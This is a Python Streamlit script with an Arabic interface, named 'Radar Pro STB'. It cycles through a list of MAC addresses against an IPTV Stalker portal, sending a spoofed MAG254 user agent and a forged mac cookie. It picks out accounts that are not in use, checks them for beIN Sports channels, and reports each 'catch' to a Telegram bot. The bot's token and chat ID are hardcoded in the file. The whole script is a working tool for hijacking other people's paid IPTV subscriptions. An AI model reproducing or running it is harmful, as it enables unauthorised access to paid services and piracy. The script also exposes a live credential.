import streamlit as st
import requests
import time
import telebot
import random
import re

# ============ 🔑 بيانات البوت ============
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# ============ 📺 القنوات المستهدفة ============
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# ============ 🎨 إعداد الواجهة ============
st.set_page_config(page_title="Radar Pro STB", page_icon="📡")
st.markdown("<h1 style='text-align: center; color: #1E88E5;'>📡 Radar Pro STB</h1>", unsafe_allow_html=True)

# صندوق إدخال البيانات
if "input_area" not in st.session_state:
    st.session_state["input_area"] = ""

raw_data = st.text_area("🚀 أدخل البيانات (URL + MAC):", 
                          value=st.session_state["input_area"], 
                          height=150)

col_btns1, col_btns2 = st.columns([3, 1])
with col_btns1:
    btn_start = st.button("🏁 بدء الفحص والمراقبة", type="primary", use_container_width=True)
with col_btns2:
    if st.button("🗑️ تنظيف", use_container_width=True):
        st.session_state["input_area"] = ""
        st.rerun()

st.divider()

# ============ ⚙️ وظيفة فحص حالة السيرفر ============
def check_server_status(host):
    try:
        response = requests.get(f"http://{host}/", timeout=5)
        if response.status_code in [200, 404, 403]: # أغلب البورتالات تعطي هذه الأكواد وهي تعمل
            return "✅ يعمل (Online)"
    except:
        pass
    return "❌ معطل أو محظور (Offline)"

# ============ 🚀 منطق التشغيل ============
if btn_start:
    if raw_data:
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            full_url = host_match.group(0).split('/portal.php')[0].strip('/')
            clean_host = full_url.replace("http://", "").replace("https://", "").split('/')[0]
            
            # فحص حالة السيرفر أولاً
            server_status = check_server_status(clean_host)
            
            st.info(f"🔎 **تحليل السيرفر والماك:**\n\n🌐 الرابط: {full_url}\n📊 حالة السيرفر: {server_status}")
            
            if "❌" in server_status:
                st.error("⚠️ السيرفر لا يستجيب، قد لا تظهر نتائج دقيقة.")
                bot.send_message(ID, f"⚠️ **تنبيه:** السيرفر `{clean_host}` يبدو معطلاً أو محظوراً.")

            found_count = 0
            placeholder = st.empty()
            
            while True:
                for current_mac in macs:
                    placeholder.info(f"⏳ جاري فحص الماك: {current_mac}")
                    
                    headers = {'User-Agent': 'MAG254', 'Cookie': f'mac={current_mac}'}
                    base_url = f"{full_url}/portal.php"
                    
                    try:
                        url_prof = f"{base_url}?type=stb&action=get_profile&force_stb=1"
                        start = time.time()
                        r_prof = requests.get(url_prof, headers=headers, timeout=7)
                        latency = (time.time() - start) * 1000
                        
                        if r_prof.status_code == 200:
                            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
                            active = match.group(1) if match else "1"

                            if active == "0":
                                found_count += 1
                                # جلب القنوات
                                url_ch = f"{base_url}?type=itv&action=get_all_channels"
                                r_ch = requests.get(url_ch, headers=headers, timeout=7)
                                ch_text = r_ch.text.upper()
                                found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                                
                                # إرسال التقرير الكامل للتليغرام
                                report = (
                                    f"📡 **تقرير الرادار المتكامل**\n\n"
                                    f"🌐 **السيرفر:** {full_url}\n"
                                    f"🖥️ **الماك:** `{current_mac}`\n"
                                    f"📶 **الحالة:** {server_status}\n"
                                    f"👥 **المتصلون حالياً:** `0`\n"
                                    f"⚡ **الاستجابة:** {int(latency)}ms\n"
                                    f"📺 **القنوات المفضلة:**\n" + ("\n".join(found_channels) if found_channels else "❌ غير متوفرة")
                                )
                                bot.send_message(ID, report, parse_mode="Markdown")
                                st.success(f"🎯 صيد جديد! تم إرسال التفاصيل لتلغرام: {current_mac}")
                    except:
                        pass
                    time.sleep(1)
                
                st.warning("🔄 دورة مكتملة.. إعادة المسح...")
                time.sleep(10)
        else:
            st.error("❌ تأكد من إدخال URL و Mac Adresse بشكل صحيح.")
    else:
        st.warning("⚠️ الصندوق فارغ!")

